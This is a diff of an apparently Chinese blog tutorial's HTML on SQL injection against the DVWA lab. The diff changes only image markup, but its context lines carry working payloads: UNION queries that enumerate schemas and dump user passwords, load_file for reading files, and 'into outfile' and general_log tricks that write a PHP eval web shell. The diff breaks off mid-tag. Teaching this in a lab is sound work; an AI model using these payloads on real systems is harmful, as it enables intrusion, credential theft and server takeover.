@@ -184,16 +184,13 @@
 &lt;p&gt;&lt;strong&gt;这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2 #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250626115719525&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34; alt=&#34;image-20250626115719525&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;这样就确定了网站执行的SQL语句为：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Firstname&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Surname&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;xx&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ID&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
@@ -204,16 +201,13 @@
 &lt;p&gt;&lt;strong&gt;&lt;mark&gt;这里一定要写全，有多少字段，select后面就要有多少相应的字段&lt;/mark&gt;&lt;/strong&gt;：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database() #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt; 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250626135800624&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34; alt=&#34;image-20250626135800624&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;于是，我们就知道了当前数据库名称为&lt;code&gt;dvwa&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id=&#34;5获取数据库中的表&#34;&gt;5.获取数据库中的表
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;information_schema.tables表存储了数据表的元数据信息：&lt;/strong&gt;&lt;/p&gt;
@@ -257,28 +251,22 @@
 &lt;/table&gt;
 &lt;p&gt;我们就可以从中得到想要的信息：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250626142534142&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34; alt=&#34;image-20250626142534142&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;上面的语句效果等同于下面的语句，只不过使用了&lt;code&gt;group_concat()&lt;/code&gt;，让输出的内容拼成了一个字符串：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250626142649062&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34; alt=&#34;image-20250626142649062&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;这样就知道了dvwa里面一共有两个表，分别为guestbook和users&lt;/p&gt;
 &lt;h3 id=&#34;6获取表中的字段名&#34;&gt;6.获取表中的字段名
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;information_schema.columns表存储了所有表所有列的元数据信息：&lt;/strong&gt;&lt;/p&gt;
@@ -330,58 +318,46 @@
 &lt;/table&gt;
 &lt;p&gt;同样借此获取users表的字段：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; and table_schema=database()#
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250706113907039&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34; alt=&#34;image-20250706113907039&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;这样就得到了users表的所有的列名称&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;这里要注意的是，除了指定表名之外，还要指定数据库名，否则就会出现很多不属于这个表的列名：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250626144509634&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34; alt=&#34;image-20250626144509634&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h3 id=&#34;7获取字段信息&#34;&gt;7.获取字段信息
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知道了表名和列名，就能轻松获取对应信息了&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;比如我想获取所有用户的id名称和对应密码：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select group_concat(user_id,first_name),group_concat(password) from users #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250626145455797&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34; alt=&#34;image-20250626145455797&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;我们在这里使用group_concat拼接了两组字符串，因为select输出的数量必须与字段数一致，这里是2&lt;/p&gt;
 &lt;h3 id=&#34;8逐行获取信息&#34;&gt;8.逐行获取信息
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;书接上文，如果我只想要显示某一条信息，就可以在末尾加上&lt;code&gt;limit m,n&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;意思是从第m条数据开始，显示包括n条数据，比如&lt;code&gt;limit 0,1&lt;/code&gt;，就是只显示第1条数据（数据从0开始存储）&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 1,1 #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627113327247&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34; alt=&#34;image-20250627113327247&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;这里使用&lt;code&gt;limit1,1&lt;/code&gt;，就只显示了第二条数据&lt;/p&gt;
 &lt;h2 id=&#34;2-报错注入&#34;&gt;#2 报错注入
 &lt;/h2&gt;&lt;p&gt;如果union被过滤，或者页面没有回显但SQL语句执行可以输出错误信息，就可以使用基于报错的注入攻击&lt;/p&gt;
@@ -642,16 +618,13 @@
     
 &lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;附上一张ascii码表：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;ASCII 表| 菜鸟教程&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34; alt=&#34;ASCII 表| 菜鸟教程&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h4 id=&#34;猜测表的数量&#34;&gt;猜测表的数量
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (select count(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39;)=2 #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;猜测表2的长度&#34;&gt;猜测表2的长度
@@ -805,16 +778,13 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;load_file&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;D:\\1.txt&amp;#34;&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配合注入语句，我们可以做到读取任意文件（当然前提是页面会有输出）：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,load_file(&amp;#39;D:/WWW/1.txt&amp;#39;) #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250707205449502&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34; alt=&#34;image-20250707205449502&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;注意：&lt;/p&gt;
 &lt;p&gt;这里使用的是&lt;code&gt;/&lt;/code&gt;，因为&lt;code&gt;\&lt;/code&gt;是转义字符，而&lt;code&gt;/&lt;/code&gt;在字符串里面没有任何含义&lt;/p&gt;
@@ -835,42 +805,33 @@
 &lt;h4 id=&#34;lines-terminated-by&#34;&gt;lines terminated by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;lines terminated by&lt;/code&gt;用来定义导出的文件中每行数据以什么字符结尾（默认是换行符 &lt;code&gt;\n&lt;/code&gt;）：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250708141833937&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34; alt=&#34;image-20250708141833937&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h4 id=&#34;lins-starting-by&#34;&gt;lins starting by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;与上一种相反，它控制的是每一行开始位置的内容：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines starting by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250708141731385&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34; alt=&#34;image-20250708141731385&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h4 id=&#34;fields-terminated-by&#34;&gt;fields terminated by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;fields terminated by&lt;/code&gt;控制的是一行数据中，各个字段（列）之间的分隔符：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; fields terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250708142123580&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34; alt=&#34;image-20250708142123580&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h4 id=&#34;columns-terminated-by&#34;&gt;columns terminated by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;是上一种的同义词，作用完全一样：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; columns terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
@@ -880,30 +841,24 @@
 &lt;p&gt;&lt;strong&gt;下面用&lt;code&gt;general log&lt;/code&gt;做演示&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;查看配置：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show variables like &amp;#39;%general%&amp;#39;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250708165305034&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34; alt=&#34;image-20250708165305034&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;开启&lt;code&gt;general log&lt;/code&gt;模式：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set global general_log = on;   
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;设置目录地址：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set global general_log_file = &amp;#39;D:/WWW/114514.php&amp;#39;;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250708165642906&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34; alt=&#34;image-20250708165642906&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;接下来就可以写入一句话木马：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39;&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250708170501479.png&#34; alt=&#34;image-20250708170501479&#34; style=&#34;zoom:67%;&#34; /&gt;
@@ -920,16 +875,13 @@
 &lt;h3 id=&#34;准备dnslog平台&#34;&gt;准备DNSlog平台
 &lt;/h3&gt;&lt;p&gt;网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator&lt;/p&gt;
 &lt;p&gt;以dnslog.cn为例，&lt;strong&gt;点击&lt;code&gt;Get SubDomain&lt;/code&gt;后，我们会得到一个独一无二的子域名&lt;/strong&gt;，例如：&lt;code&gt;624elh.dnslog.cn&lt;/code&gt;：
-&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250701173327303&#34;
-	
-	
-&gt;&lt;/p&gt;
+
+&lt;div class=&#34;post-img-view&#34;&gt;
